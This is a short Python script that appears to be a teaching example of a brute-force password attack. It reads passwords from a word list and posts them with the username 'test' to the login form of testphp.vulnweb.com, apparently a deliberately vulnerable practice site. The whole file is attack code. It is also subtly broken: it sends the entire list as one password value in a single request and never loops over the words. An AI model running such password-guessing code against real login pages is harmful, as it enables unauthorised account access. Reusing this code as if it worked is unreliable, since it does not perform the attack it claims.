#!/usr/bin/env python3

import requests

target_url = "http://testphp.vulnweb.com/login.php"

data_dict = {
    "uname": "test",
    "pass": "",
    "login": "submit"
}

with open("password.list", "r") as wordlist_file:
    words = [line.strip() for line in wordlist_file]
    data_dict["pass"] = words
    response = requests.post(target_url, data=data_dict)
    if "login failed" not in response.text:
        print(f"[+] Got the password --> {words}")
        exit()

print("[+] Reached end of the line.")